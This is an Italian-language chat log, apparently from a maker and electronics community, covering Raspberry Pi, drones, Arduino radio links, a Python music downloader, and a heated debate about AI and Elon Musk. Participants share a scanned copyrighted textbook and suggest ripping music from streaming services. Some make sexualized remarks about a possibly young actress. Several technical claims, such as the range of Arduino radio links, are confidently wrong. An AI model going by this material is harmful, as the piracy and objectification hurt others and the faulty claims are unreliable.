 "Vendesi rene perfettamente funzionante, usato garantito"
una domanda... qualcuno ha capito SE con il raspberry pi 3 b+ è aumentata anche la velocità delle porte USB?
Perxhè con la gigabit ethernet potrebbe tornare parecchio utile come nas, Finalmente
io ho capito che c'è la gigabit over usb
la gigabit ethernet del raspberry b+ si ferma a 300 Mbit/s
CHE
del tipo te attacchi un adattatore usb ethernet e va ma non sono sicuro
allora mi devono spiegare perchè la pubblicizzano come gigabit -.-
non ne ho idea
USB 2.0, confermo
vabbeh dai 300mbit non fanno schifo
dovrei provarlo con un hdd e vedere come va... se mi  gira lo compro
per un Nas casalingo bastano e avanzano
eh infatti
sono quasi 40 megabyte al secondo teorici
chebbelli i libri degli anni '60 sull'elettrotecnica, mi fanno sentire nel futuro ._.
se ti serve un libro serio di elettrotecnica te lo passo io però è di livello universitario
Ma cos'è hai crackato qualche libreria universitaria?
no, ha comprato l'ebook la mia fidanzata 
è ingegnere elettronico
no beh, io mi studio tutto da questo che è fantastico, spiega tutto nel dettaglio...anche se parlando della teoria atomica ha completamente mandato a farsi fottere heisenberg ma vabbene così
Brutta storia
Passa passa ahah
E fa bene
della serie che "secondo il modello di bohr gli elettroni si muovono secondo orbite ellittiche ben definite"
Modello molto correggiuto
c'è..ok tutto, ma heisenberg dove ce lo metti
Ma l'atomo è un panettone

Punto e fine
questi sono più semplici Giulian  

La Terra è il centro di tutto il sistema solare
Non era un 3310?
Il Sole gira attorno alla Terra
Con i canditi, suppongo 
wait, sto inviando questo che uso io, l'idea è quella di fare una certa patente avendo 16 anni o più e una cittadinanza italiana
Quello è Dio
Non ci sono integrali di convoluzione, non vale niente
Thomson bitch
è di livello liceo
mica gli posso dare un Sedra-Smith da leggere, non ci capirebbe nulla
questo è
Ma secondo me in elettronica, vanno benissimo i libri di duemila anni fa
here, questo mi sto studiando
concordo
Tanto non è cambiato nulla e non fa differenza il fatto che siano gli elettroni a muoversi o i protoni
 toh Giulian, poi non dire che non ti voglio bene :D
Raspberry Pi con PoE
 ti sto mandando il Sedra-Smith, il miglior libro di elettronica esistente 
ottimo, lo possiede mio suocero
si ok ma io mi devo studiare tutto il programma per la patente di radioamatore e quello in teoria è uno dei migliori che si trovi
vero, è ottimo, me lo sto scaricando
*bibbia da 99999 pagine da gioele intensifies*
Supporto PoE
Era una battuta
è il miglior libro universitario di elettronica..tienitelo caro perchè costa un botto di soldi
lo so  gli ho anche mandato le dispense universitarie
Italiano?
quanti TiB pesa sto libro giusto per sapere? no perchè vedo che è da un po' che stai tentando di inviarlo
vabb, torno tra 20 minuti, poi me lo scarico e lo metto da parte per tra 3 anni nella chiavetta speciale nascosta per le robbe a lungo termine
Le connessioni dei paesini sono così
no ma quel che mi preoccupa è che per gli altri file da 10MiB ci ha messo instant
In effetti
2000 pagine ahahha
ovviamente..la versione inglese non ce l'ho
85 mb.. ho una ADSL, abbiate pietà
ha quasi finito
Io li trovo a basso prezzo solo in inglese sti libri
🤔mi pare l'abbia comprato su IBS
Ah okay perché non si trova in rete xD
infatti il Sedra è palesemente una copia scannerizzata l'ebook che devo farmi dare dalla mia fidanzata è quello di circuiti e microonde e anche quello di impianti elettrici
 questo è adatto per il liceo
Un pezzo di storia ahahha
hoepli o zanichelli?
Cremonese
🤔 non ce l'ho presente..deve essere parecchio vecchio
io vado, a stasera 
Maker's Book Bazaar Group?
Eh sì... 75
thx & ciauuzz
 ancora non sono riuscito a collegare la RunCam, non pensavo fosse così complicato ahahhahahaha
beh dai, sembra buono, prima mi leggo questo sui radioamatori e poi do' un'occhiata pure a questo
Che problemi hai?
Sono ritardato ecco
Ahahahhaha
Ma infatti non lo è ahhaha... lo spinotto in un modo solo dovrebbe andare
Quello un po' tutti ahah no dai, seriamente, riassuntino? Dove la stai montando?
Lo spinotto non entra nella ricevente del radiocomando (Flysky FS-i6S)
RunCam la sto montando sul mio drone 450, Naza v2
E vorrei collegare la cam alla ricevente del mio rc Flysky FS-i6S
Avevo questa radio, esteticamente bellissima, funzionale
Concordo si
Perché devi collegare la camera alla radio?
Mi sembra il modo migliore per darle corrente
Sono 5V
Non usi una bec collegata alla batteria? O degli esc?
È quello il modo migliore e più semplice
Non ho bec
Secondo me era più comodo alla ricevente, almeno ho i cavetti e non devo comprare altro
È collegando il + e - alla trasmittente non gli dà corrente?
There is the problem
Ti va di andare in privato così non intasiamo qui?
Un bec è molto più stabile e manda corrente più pulita comunque
Va bene, nessun problema
Perfetto
Così parli con i camionisti?
così uso un lampione della luce come antenna e copro radiomaria in tutta la città e sono pure legalizzato a farlo
Vuole la tessera per iscriversi è avere sconti alle fiere ahah

Ragazzi mi serve una mano
L'application level gateway e il server proxy sono la stessa cosa?
L'Application-level gateway fa da intermediario tra internet e l'Application Server. Ogni richiesta viene interpretata, tradotta, in modo da essere compresa dall'Application Server e depurata, in modo da prevenire il passaggio di contenuti maliziosi o malformati. La richiesta viene poi mandata all' Application Server, la cui risposta verrà processata allo stesso modo.

L'Application-lavel gateway fa uso di due tipi di proxy:

Proxy specifici dell'applicazione. Vengono accettati solamente i pacchetti generati da servizi che i proxy sono progettati a copiare, filtrare e inoltrare. Per esempio solo un proxy Telnet può copiare, filtrare e inoltrare traffico generato da Telnet. Questo può costituire anche uno svantaggio, se una rete dipende solo da un application-level gateway, i pacchetti (in arrivo e in uscita) non potranno accedere a servizi per cui non è disponibile un proxy. 

Filtraggio a livello di applicazione. Ogni pacchetto che attraversa la rete viene esaminato e filtrato, verificando i contenuti del pacchetto fino al livello di applicazione (l'ultimo livello del modello OSI). In questo modo è possibile filtrare comandi e informazioni destinate all'applicazione.
Fonte: Wikipedia
Comunque è SIMILE non uguale
An ALG is very similar to a proxy server, as it sits between the client and real server, facilitating the exchange. There seems to be an industry convention that an ALG does its job without the application being configured to use it, by intercepting the messages. A proxy, on the other hand, usually needs to be configured in the client application. The client is then explicitly aware of the proxy and connects to it, rather than the real serve
Ah bene grazie per l'aiuto
Ragazzi ho un problema...
Come si può fare per trasmettere un seriale di un Arduino ad una distanza di 1km verso un pc?

Come flusso di dati sono a 1200 baud quindi molto poco
1km? tu sogni
In linea d’aria senza ostacoli 
appunto
dipenderà pure dalle condizioni dell'aria ma dubito tu possa superare i 10 metri
Roba futuristica 
ma anche 5 metri sarebbe già tanto
Peggio ancora
è un arduino, mica trasmette in analogico sinusoidi, almeno quelle avrebbero favorito un po' il raggio ma 1) si parla di onde quadre e 2)si parla di troppa poca potenza, è un arduino, con un raspberry pi 3 non superi i 10 metri, pensati un arduino
Servirebbe una magia gsm
Forse mi sono espresso male  
Intendevo via radio  tipo 433Mhz o 2,4Ghz

Si sì so che via cavo non arriverei a 10m
chi parla dei cavi scusa?
con un seriale di un arduino 1) non raggiungerai mai simili frequenze di trasmissione, al massimo 2MHz e sarebbe anche instabile 2) sarebbero onde quadre, non sinusoidi, e quindi "tagli male" l'aria, fai meno distanza, sei più soggetto ad interferenze 3) un arduino ha troppa poca potenza, non riuscirebbe a fare nulla che dopo poco più di qualche metro non si fermerebbe
inoltre trasmettere con i pin di un arduino non so quanto sia cosa bella
Ho capito 

Ma anche con un modulo ad-hoc? 

Ad esempio un modulo lora che sulla carta copre 10-12 km farebbe il lavoro o no??
Ma spari a caso?
a beh no, quella è un'altra storia
noh, seguo le indicazioni fiere imparate durante le notti su wikipedia
e anche ad esperienza un po', guardando tipo la distanza a cui il tuo segnale diventa una pubblicità turca di tappeti
è ovvio che per inviare un segnale si debba utilizzare un modulo dedicato di trasmissione, però non escluderei a priori che con arduino + qualcosa si riesca a trasmettere
io avevo capito intendesse "trasmettere usando direttamente il pin come antenna"
e l'arduino stesso come trasmittente
clicbeeiithhh, solo perchè c'è elon in copertina ci saranno almeno 1000 persone in live
Stasera si va in tendenza 
Elon + Marte + raspberry = awesome
SEEEEEEEE
(+ astronave aliena/wtf è quella roba)
È quella che dovrebbe salvare la specie umana dall'armageddon delle intelligenze artificiali
Allora possiamo stare tranquilli
studiato lui
 
fa tanto schifo per cominciare?
è letteralmente il mio arsenale un pelo impoverito
Quindi ci sta?
Raga
Hobbyking è la vita.
Prendine uno con la base, almeno non ti rifilano 20 accessori
che poi vabb, ci serve anche un multimetro, una filiera e altre cosuccie
beh per iniziare direi di si, ci sta, magari quando puoi cambia lo stagnatore e prenditi una base vera
Ok grazie 
Questi per intenderci 


Non importa la marca tanto sono gli stessi
Il progresso, diceva
Il razzo ritornerà, diceva
Non faccio pubblicità, diceva
Ho 40 minuti per cenare, ce la farò?
Si
In questo albergo non ci giurerei così tanto
Uh
La roba fa schifo e te la portano 20/30 minuti dopo che ti siedi a tavola
E la pasta è pure scotta
🤢
Mi sa che vado in camera, live e pizza da Just Eat
Ragazzi utilizzando un Arduino uno riesco ad usare contemporaneamente sia la comunicazione seriale che la comunicazione Spi(mi pare che sia questa la comunicazione in parallelo) ?
Arduino supporta la connessione parallela? Sicuro?
Con usb è impossibile
Beato te che ce l'hai
Just Eat? Mai usato fino ad ora 
Ah buono
Dove abito io consegna a domicilio solo se li chiami
Chissà perché non hanno servizi del genere
Google assistant dissing a alexa
Ma quanto ho visto ti parlo di 1-2 anni fa
si ma...chi ha parlato di "accedere direttamente ai dati", è stata lei a tirare fuori l'argomento
Almeno non si è disconnessa
Ho comprato un modulo wireless. Sono quasi del tutto sicuro che usi la parallela
Ma chi è
ignurante
Parecchio
o troll
a me segna "in attesa di overVolt"
Siamo in liveee
Il tempo di farmi un piano di scale e ci sono
Non si aqqiorna la pagina
Ciao
Raga devo prendere il fili PLA anet quale mi consigliate?
Ho donato, mi sento una perzona felicia
Chi mi può aiutare con sqlite?
Io 
Praticamente il valore ID che è NOT NULL, PRIMNARY KEY, AUTOINCREMENT, UNIQUE dopo l'uno mi passa al 5...
Tu sei cattivo
Why?
Boh
Sei nel mio gruppo quindi sei malvagio
io sto utilizzando il sunlu pla+ su amazon e non è male
Prova a cancellare la table, ricrearla e a ripopolarla
Ok
Hai finito i compiti? 
Quale link
 
  che fai?! Mangi in live?! 
L'altra opzione era mia madre che mi perseguitava per tutta casa con uno zoccolo in mano
Credo che hai scelto bene 
Ora mi parte da 9
Grazie
Ok, adesso funziona
 che fai? Mi snobbi
 hai appena capito che mi chiamo Simone?
Ah pensavo che ci fossero meme ovunque
Sta azzeccatissimo 
 (stava parlando proprio di Aranzulla)
lol

Ma hahhaha
Vi manca memare me inseguito da Elon Musk in giro per lo schermo, però 
Si, ma non finivi più di parlare di razzi 
per entrare alla robocup a Trento serve qualche biglietto?
Boh, sono sempre stato come gareggiante
bellissima live
onesto
va beh se serve un biglietto entro tipo squadra anti sommossa
Porc*
Io entro dicendo "sono overVolt"
io dico che sono u  discepolo di overvolt
Come Keledan all'apoca ai concerti dei Dream Theater "sono Roberto di 
" e via di prima fila 
Meno YouTube
Hahahahah
Ma seriamente hai capito adesso che mi chiamo Simone?
CHE MI SONO PERSO
Leggermente sforato quel warning eh
Ma te sei pazzo
Ma leggermente
Me inseguito da Elon Musk in giro per lo schermo
:si reinizia a vedere la live:
Si... So leggere il cinese mandarino ma non so leggere l'italiano al contrario
*dissing*
Ehhhh
Comunque io ero ARTUR
Ovvero rutra
Che?
Anagramma di tutra
Ahhhh
Ho visto... Smettetela di creare account fake per partecipare ai giveaway DJI
Ahahahahahah
Ooohhhh🧐

Mi sono sempre chiamato ARTUR su YouTube 
Comunque non conviene secondo me il nuovo rasp
voglio un bel meme
Non c'è niente da memare
Già è un meme di suo

Metti la scritta "ho un razzo enorme"
overvolt fra 20 anni

*Io tra 5
 ti piace come idea? Possiamo procedere?
Intanto mi rilasso un po' dalla live
Da quando parli cinese?!

e il cioccolato?

Preoccupante 

Quindi parli in cinese con quelli di bangood?
Ha detto "vi odio tutti"
Ammettilo che lo fai solo per i soldi
Comunque ho detto male il jia
❤️
lo avevamo capito
HAHAHAAHHAHAAHHHAHA
Solo perché mi chiamo ARTUR su YouTube 
他的家人有两个人
这是什么？
Google traduttore aiuta...
Anche la mano aiuta
Ahahahahahahah
Questa cosa  ci sta sfuggendo di mano....

In realtà dovrebbe significare "come si chiama?"
serve una mano per risolvere
Questa può andar bene?
uhm...
Quando non apri Telegram tutto il pomeriggio per studiare
Questo è scemo 
*esaurito
Sarà stato la live
nono, intendevo che "shemà" si traduce "scemo", no? 
Lezioni di cinese da Romboli

Ma si possono mischiare le parole per comporre frasi diverse 
Hai avvisato che non pago?
Ma guarda un po
Fa tanto lamer sto stickerpack
Siii è bellissimo
l'username 
 è libero, comunque 
Non esiste maschile/femminile, non esiste (circa) singolare/plurale, non esistono tutti gli articoli e le proposizioni... È tutto un giocare coi lego
woooo
mm sembra più semplice di quel che pensassi
(sembra, poi ti voglio vedere a leggerlo )
Eh lo scoglio è tutto sugli ideogrammi
Però anche quelli... Molti sono due altri idiogrammi schiacciati insieme a formarne uno solo in un quadrato
Ma dove lo hai studiato?
Mi stai facendo venir voglia di studiarlo
Sicuramente fra 20-30 anni sarà la lingua universale
Raga è morto Ultron 5
Se si continuano a riprodurre come animali 
Cos?
Si
A livello economico ci mangiano
Però non crescono
Rimangono bassi
Ad esempio Hao (bene) 好 è un "donna" 女 e un "bambino" 子 schiacciati in un unico carattere... E questo è molto comprensibile per la società cinese dove se non ti sposi e hai un bambino il prima possibile sei un povero derelitto 
Madonna che casino 
Lol

Ad esempio adesso sto vedendo "la torta costa 10 yuan"... E in cinese è "torta 10 yuan"  neanche una parola in più del minimo necessario
È risorto
come l'arabo
ma hahahahaha che giri mentali
si, come anche in italiano, esistono le parole, le metti a caso, fai le frasi
O forse no
arco
terra
piatta
puf 

perfect ù-ù
Hahahahha
comunque ora sono a pagina 34 del librone, continuerò un altro giorno, per oggi ci sta così, sto ancora pensando al fatto che le onde si propagano non solo verso l'esterno ma anche verso l'interno dell'antenna stessa....yee
regalatemi un tubo catodico
Live per me finita ora, giusto un po di lag
Cooosa
2 secondi di live e 2 secondi di attesa a caricare..... ho finito I giga
🤦‍♂️🤦‍♂️🤦‍♂️🤦‍♂️🤦‍♂️
Finiti due settimane fa
A che qualità hai guardato? 
144p, di meno non potevo, altrimenti l'avrei ascoltata
Il massimo era 720p mi sembra, io 360 ovvio
Orca... E anche in 144p si bloccava? 
Era 1080p spero 🤔
Interesting
A me non faceva selezionare più di 720p, ma io si solito manco le guardo i video, li ascolto e basta
 hahahahahah
AHAHAHAHAH
sei famoso
 
 se trovate la richiesta da Simone sono io 
ah ecco, mi è appena arrivata 
Sono appena uscito da una sessione di programmazione, la più utile della mia vita
Che hai fatto?
Stufo di siti per scaricare musica da YouTube ho fatto sto script in Python che prende da un file txt che scrivi te una lista di canzoni, le cerca su YouTube, te la scarica in mp3, cerca il titolo in Spotify e ottiene cantante, anno e genere e li aggiunge ai tag dei file mp3

Lo metti su git?
Sembra una cagata ma sono stra felice
Ho iniziato oggi py
Vedi tu 
Fai un ripper da Spotify a questo punto
Registra la canzone durante il playback di librespot (la libreria ufficiale di Spotify)
Eh ma non devi aspettare tutta la durata della musica?
Ma parlando di cose serie.....
Quanto è figa la ragazza in don Matteo?!
 
Oddio qualcuno che la pensa come me
È proprio bona oh
Ma ahahaah
Ma l'hai vista?
È più open di Linux 
Le discussioni serie
 condivido e sottoscrivo
Ahahahahahah
🤔 chi sarebbe codesta bella figliuola?
È piccola per te
Che pervertito 
 ma che so, mica sto guardando Don Matteo
Io lo vedo solo per lei 
 mariasole pollio
Faceva video su YouTube
Ho visto adesso 
Ah rip, sono arrivato in ritardo, la seguono già 18 persone che conosco 
Alla buon ora!
Ormai 
Chissà perché marco le live le mette sempre quando non posso
Ahahahahahah
Ha un sesto senso 
Vabbè ti faccio un riassunto...
Rock64 da prendere
Raspberry pi 3 B+ buono ma nulla di troppo spettacolare
E per il resto del tempo ha parlato di razzi
Ecco grazie ❤
Eeh gli piacciono i razzi 
E di salvatore Aranzulla
E di quanto elon riesce a farli bene 
Molto lunghi e potenti
Questa parte l'ho saltata per mariasole
Lunghi poi
Look on
Ma che ahahaah
Or this
Ma è fissato con i razzi?
Hai capito il doppio senso?🧐
Ha fatto pure il progetto di oleodinamica
(la cui fisica ho risolto io)
Che studente modello
Minchia oh, che incubo quel problema
Ha spiegato come sono controllati e quanto sono forti
Ah, dimenticavo
Roberto è la fisica/matematica/informatica/conoscenza fatta persona
Tipo questa dovrebbe essere il riassunto della formula risolutiva
Qualche giorno ti voglio incontrare così mi eredito un po' di conoscenza
Ha parlato di robotica e di quanto potremmo essere vicini a creare un umanoide che impara
❤
Capito tutto guarda
Si anche ieri se ne è uscito con ste teorie.. Ma io la penso in maniera alquanto diversa, più alla Hawking
Lui alla musk a quanto pare
*distruzione* in breve
Abbiamo anche parlato della bravura di musk
E di un possibile Arduino grande quanto una casa in grado di distruggere il mondo per qualche secondo 
Mi astengo dal dare un giudizio, si entrerebbe troppo nel mio giudizio personale e politico su musk
Secondo me se le inteligenze artificiali raggiungeranno i livelli di quelle umane stiamo parecchio messi male perché un sacco di settori lavorativi se ne vanno
Diventeremmo tutti programmatori
Stai evitando la rissa?
Ok che se ne creano altri ma finché le macchine non impareranno a fare anche quello
Eh inteligenze artificiali che programmano altre Inteligenze artificiali
Fino a quando non riusciranno ad adattarsi ad ogni situazione, imparando
Non sarà mai possibile
Circa
Più che altro una discussione inutile
Coff
Pare che Google l'abbia già fatta
Riuscirebbero solo a riprodurre cose già fatte
Ecco
Dai vogliamo sapere la tua opinione, non discuttiamo
Ti pregooo
Qualcuno può uccidere google? Grazie
Se si mette nel nucleare può fare uno stato a parte
Impero google
Hai paura di esporre la tua idea? 
Ma vaffanculo
Speriamo si uccida
Ha fatto anche cose molto buone
Con i dati che ha può fare tutto
Tipo?
Tipo
Mmm no, ma a quest'ora sono stanco e non mi va un battibecco 
HA RIVOLUZIONATO IL MONDO
Tipo stivegiobs
Lo sai che il tuo account Google ha tutti i tuoi log?
Di ogni azione sul tuo dispositivo
Devo farci un video
Citami
Tutto questo per fare pubblicità personalizzata
Anche a me oh
Per ora: non raggiungeremo la singolarità prima di una quindicina d'anni... Ma dopo?
E quindi?
E quindi come mangiamo?
Ti aspetto domani 
C'è pur sempre qualcuno che ci guadagna
No, scusate.....
La classe operaia se ne va
Io stavo parlando di qualcosa di serio
Oddio entro in politica
Se quel qualcuno invece di pagare i dipendenti paga le macchine... Semplicemente abbiamo più tempo libero
Da qua a parola "comunismo"
Non dei file mentali che vi fate 
Tanto di guadagnato a non smazzarsi di lavoro
È un problema serio
Comunque per programmare dei robot che agiscono da umani ci vogliono dati.....chissà dove possono prenderli
Reddito universale?
Mh tu dici?
Se andiamo avanti così... Nel giro di una decina danni spariscono più o meno un terzo dei posti di lavoro
Mai visto Wally? O come si chiama
Cacatemi
No, si chiama 'riduzione dell'orario di lavoro a parità di salario'
Oppure programmare una rete neurale con una complessità dell'ordine di grandezza di quella umana e aspettare
Wall-e
Aspettate cosa? Di essere distrutti?
Ah, vabbè quello
La scienza e la tecnologia non sono né buone né cattive. Sta tutto a noi
Nel cartone sulla terra rimangono i robot
Aspettare che diventi fottutamente intelligente
Ok io non ho detto niente
Buonanotte
Notte 
E l'uomo inizia crociere spaziali, seduto su sedie che volano, senza muovere un dito
Ahahahahahah
Si ma erano robot stupidi, programmati... Invece una rete neurale abbastanza complessa è... Un essere vivente? 🤔
E magari acquista consapevolezza di sé e decide di distruggere la razza umana
No, teoricamente non riusciremo mai a fare un robot uguale a una persona
Ma per piacere... Siamo bravi a distruggerci tra di noi
Iniziamo dal piccolo
Distruggiamo Google?
Con l'arsenale atomico a nostra disposizione dovrei preoccuparmi di un computer da qualche parte?
Mica va fatto uguale, basta sia complesso
Un attacco DDoS da parte di tutto il mondo, che dite?
A cui stacco la spina e bacy e abbraccy?
Yup: sono più pericolosi, fidati
Io ho paura delle persone, non delle macchine
Si, ma le azioni dell'uomo sono influenzate dal suo passato, dalle sue scelte, dall'ambiente in cui ha vissuto
Perché dovresti staccare la spina?
Sono pericolosi se noi vogliamo siano pericolosi
.
Beh se il mio portatile cerca di uccidermi io la spina gliela stacco. E per buona misura lo butto anche dal balcone
Ci credo proprio
Poi beh, se costruiamo il super mega robot gigante potentissimo siamo coglioni noi e l'estinzione ce la meritiamo
Non una cosa che si evolve da sola... Guarda ad esempio nel suo piccolo l'algoritmo amazon che ti suggerisce gli ingredienti per fabbricare bombe
Dopo 3 secondo sei giù con la speranza di non aver perso i tuoi dati sul PC o la password di Facebook
Eh il punto è che per noi ti riferisci ad una ventina di persone al mondo massimo, noi altri non possiamo farci nulla, se il missile parte ce lo prendiamo
Hey, abbiamo a che fare con queste cose da millenni. Si chiamano ESSERI UMANI
Big spoiler:
Si evolvono da soli
Pensano da soli
Fanno le cose per loro vantaggio
Se per questo se tu scrivi "v" nel campo di ricerca, la prima cosa che mi compare è un vibratore
Pericolosissima la rivolta dei vibratori oh
Mica da sottovalutare
Sono stupidi
Ahahahahahahah
Si ma non è che esce un coltello dallo schermo... È una cosa graduale... Se crei un'intelligenza più complessa di te per forza di cose le due specie dovranno confrontarsi, non per forza in modo violento ma boh
Siamo abbastanza intelligenti ad essere arrivati a questo punto
Fuck
È la questione di un Neanderthal contro un Sapiens
 avevo trovato una super offerta per infinity da pubblicare!
Quando tu ti confronti con Hawking ti stai confrontando con qualcuno di più intelligente
E non mi pare che ci si faccia pare mentali
Non a quest'ora 
Te non hai ancora capito che non si può vero? 
Mi viene istintivo!
Il big problem... È che da queste tecnologie ci trarranno profitto in pochi
Vuoi che ti mando le offerte in privato?
E se non ci pensiamo ora, i molti lo prenderanno in culo e basta
Ahahah no grazie
Si ma è del mio stesso ordine di grandezza... Non petaflop 
I ricchi di ora diventeranno sempre più ricchi
Mah
Ecco ahahahahah
  se vuoi lo metti, sennò vaffanculo 
Oh, ma che ha fatto l'uomo in 2000 anni?
E soprattutto, ammesso che ci sia questo problema (che io non vedo, ma ammettiamo che ci sia), la soluzione non è andarsene su marte
Ha fatto progressi tecnologici e poi?
Perché se sono così intelligenti da essere pericolose per noi ci seguono anche lassù e siamo punto e a capo
Moralmente che ha fatto?
Tanta roba
Verissimo
Tipo?
E tantissima ne deve fare ancora
Ci siamo veramente evoluti?
Secondo me Staino facendo progressi solo in campo tecnologico
Che poi a me può andar pur bene
merita la ragazzina..crescerà bene
Boh musk lo vedo un sacco come un ragazzino viziato che ha bisogno dei riflettori puntati addosso e quindi spara minchiate a raffica una dietro l'altra per attirare l'attenzione
Fino a quando le persone comprano il  tostapane con il wifi che posso rendere inutilizzabile in 5 secondi
Visto?!
Mica tanto viziato
geroglifici mode on
Vabbè al massimo la lobby delle intelligenze artificiali ti obbliga a farti i toast bruciacchiati
si si ottima scelta
Beh
Eh intanto però ha lanciato il falcon heavy con un (quasi) successo
Staremo a vedere, finora le ha imbroccate tutte ed è molto più realista e utile di tante schiere di studiosi teorici
Ha un po' di manie di protagonismo
O ti trovi il lamer che ti passa vicino casa e ti rompe il cazzo
Sarebbe figo?
Zacchete la frecciatina
Palese.. E? Anche Stalin 
E doppia frecciatina ☺️
Intanto se la tesla di musk è un orbita c'entrano anche gli studiosi teorici che non servono a un cazzo
Stalin è un coglione, quindi?
quello ha rivoluzionato solamente il suo portafogli e anche il modo di rincoglionire miliardi di persone contemporaneamente
Poi ti faccio sapere se ci sono altre figure che alzano il livello (in tutti i sensi)
Ah boh ho detto il primo russo che mi viene in mente associato al komunismo 🤔
E boh se per realista intendi "andiamo su Marte che le intelligenze artificiali ci uccideranno"...
Come musk
Scusate no.....
🤔 quelle le hanno parecchi grandi..Einstein, Hoppenheimer, Tesla, Edison
Ma nel mondo solo una piccola nicchia di persone ha così tanto potere da influenzare il mondo
Nah, quello di Marte sarebbe solo un backup di civiltà... Non uno scappare in massa
Forse meno del 3% della popolazione mondiale
Il senso è quello
Giusto perché ad arrivare su Marte ci metti 6 mesi quindi hai il tempo di pensare
Andiamo su Marte che altrimenti moriamo tutti
Quindi ci dovremmo preoccupare di quello che quel 3% ha ADESSO
sono megalomani entrambi
E non pensare a quello che avrà
Megalomani e che pensano al loro portafogli
E scusatemi ma di sta gente non mi fido 🤗
Vero 
Marco ci compriamo il biglietto? ci portiamo anche Roberto però
Non fai il backup al pc perché sennò ti si rompe l'harddisk... Fai il backup all'harddisk casomai ti si rompa l'harddisk
Io preferisco rendere la testa un posto migliore
Ho l'idea del secolo
Nobile
Faccio il backup perché altrimenti perdo tutto
Facciamo una capsula tipo quella di Futurama?
Una cosa rapida e indolore
E più utile di musk
Roby sei in modalità Bender stasera?  "con blackjack e squillo di lusso"
Ahahahahahah
Mm no è che musk mi sta alquanto sul pene
ma dai che schifo, è anche orrendo..capirei se dicessi sua moglie
Ahahahahahaahhaajahahaajajaha
Corrado ha vinto tutto
Fissatelo 

E ancora più di musk mi dà fastidio il ritratto che ne si fa di lui di "benefattore dell'umanità"
È una qualche attrice se non sbaglio
Io ti voglio come presidente del consiglio (sicuramente meglio dei tanti candidati)
Lo è
Vado ad informarmi
Assai proprio
Benefattore del suo portafogli
per dirla come il grande Cetto Laqualunque: "cchiu pilu pi tutti"
Anche, e ci sta tantissimo
Beh per come la vedo io tutte ste cose le fa per guadagnarci e basta
E questo non è un benefattore
È un banalissimo uomo d'affari
Non mi piace
Nessuno fa nulla gratis, se non in rare eccezioni
I benefattori lo fanno 🤗
Mi aspettavo qualcosa di più dalla moglie di musk
Il mondo va avanti coi soldi, purtroppo
Si chiamano mica benefattori per nulla 
Ti presto la biografia, perché qua mi sembra che il comunismo ti accechi
Nah non mi acceca nulla. E il comunismo c'entra come i cavoli a merenda marco.
Ecco la moglie
Manda il PDF no?
eccola qui
Mi sa che questa è la prima
Nella foto che ho mandato io sembrava cessa 
Ora controllo
Eh si, ma son pochi
E con ciò vi abbandono altrimenti domani chi si alza
Oh sisi certo
Eh lo ho cartaceo
Due mogli, tre matrimoni...
Lo mando io
Due figli
è il classico capitalista/incantatore di serpenti, come lo furono al loro tempo Rockfeller, Edison, Ford e tanti altri..un grande capitalista ma filantropo da prendere ad esempio sarebbe Carnegie
D'accordissimo
Non conosco il tipo però 
come fai a non conoscere Andrew Carnegie!
Musk è un uomo d'affari che pensa a gonfiarsi il portafogli atteggiandosi a redentore dell'umanità
 30 secondi al PDF
No 
Sai come si diverte?
Che poi faccia cose utili... Quanti è che sono diventati ricchi vendendo trapani per acqua e pentole bucate?
Un mondo
è uno dei miei idoli, ho anche la sua foto al laboratorio incorniciata  

🤔 trapani per acqua? Emma Marcegaglia direi
Tipo santino 
Vabbè guys
Volevo andare a dormire mezz'ora fa 
Lo sapevo che non dovevo farmi trascinare 
Lo sai che siamo coinvolgenti 
Dillo che ti diverti dai
è stato un grande della storia..il Ponte di Brooklyn è costruito con il suo acciaio
È uno spunto per confrontarsi e aprire la mente
quando parti sembri Marco in discesa con la bici
Ho scoperto ieri sera del video
Ora non ricordo il detto preciso: "vizio privato, pubblica virtú"
Ecco
Magari con una sola zeta
Sempre pronto 
Hai visto che ora è? Io ho sonno alle 8 di mattina, pensa te come sono messo la sera tardi
Le scuse
Zio zia zie non raddoppiano mai, tranne pazzia razzia e derivati
Quindi anche se pensa alle sue tasche, alla fine quello che giadagna reinveste facendo guadagnare una barca di persone
Sei un dizionario umano 
Questo non è un benefattore però
Sono rincoglionito dal sonno, altrimenti certi errori non li farei
Nop, ma fa comunque del bene alla fine dei conti
Allora anche Berlusconi è un benefattore
Non è più la gente che ingigantisce la cosa?
Cosa avrebbe fatto di buono senza contare l'aver fatto sprofondare un'intera nazione e altre cazzate?
🤔per le "olgettine" sicuramente..idem veline, letterine, e tutto il repertorio
Aver creato un bel po' di posti di lavoro
roby guarda la mia foto profilo :D
Ow 
Secondo me, un esempio di benefattore è Assange. O Snowden. O Torvalds. O Stallman
Elon non ha creato solo posti di lavoro, ha fatto innovazione
(poi non conosco troppo bene le loro biografie per escludere che siano pezzi di merda eh)
visto quanto è cresciuta?
Minchia  è l'unico
Non sto sminuendo la sua capacità di innovare
O di inventare roba nuova, di vedere nel futuro, ecc
Solo che boh secondo me non è un benefattore
ragazzi, non dimentichiamoci che ha fondato Paypal, salvandoci il culo dalle truffe online🤔 diamo a Elon ciò che è di Elon
 questo dici?
Ma chi ha detto che è un benefattore?
Ma chi lo dice che è un benefattore, lui o la gente?
Marco 
Ah
Ah... Allora noi due stiamo dicendo le stesse cose in modi diversi, e comunque andiamo contro quello che lui ha detto xD
Non è un benefattore in senso economico, mai detto... Lo è sotto l'aspetto dell'innovazione, del progresso, dell'ambiente...
È un affarista
lo sto leggendo in questi giorni, assieme a Sapiens di Harari
Troppo pesanti per me
E questo è un buon business
i suoi dipendenti e tutte le aziende a cui fa risparmiare milioni di dollari di razzi vettori
Come fai a dire che il suo scopo principale sia la pecunia?
Secondo me non lo è
questo è vero, è uno che spinge parecchio..è come un mulo testardo
Probabilmente non lo sapremo mai
O forse si, magari sta scappando su marte or ora
Prendi un Warren Buffett... Ha creato posti di lavoro, è un benefattore: il secondo più spenditore in beneficenza della storia dopo BillGates... Lui però è un tizio money-driven
eccolo qui il buon Elon :D
Ah aspetta...
Creare posti di lavoro vuol dire essere benefattori?
Uno che pensa ai soldi non si ipoteca casa per continuare a progettare macchine elettriche in una compagnia in totale perdita 
Non voleva dire trovare gente che ti fa guadagnare?
Ah boh tu l'hai dettp
Era ironico 
🤔i politici italiani la pensano cosi
Svegliati, hai letto qua?
Mica ho tirato fuori l'esempio del Berlusca per nulla
Sono sveglissimo tesoro
Non mi sembra, perché a caso mi stai mettendo in bocca cose che non dico
Tu hai detto "è un benefattore"
^
E sto esponendo la mia idea secondo cui non lo è
Tutto qui
^
Dipende da cosa intendi per benefattore. Teoricamente è chi apporta beneficio ad altri, tu intendi chi, oltre a questo, ha anche come scopo il beneficio altrui.
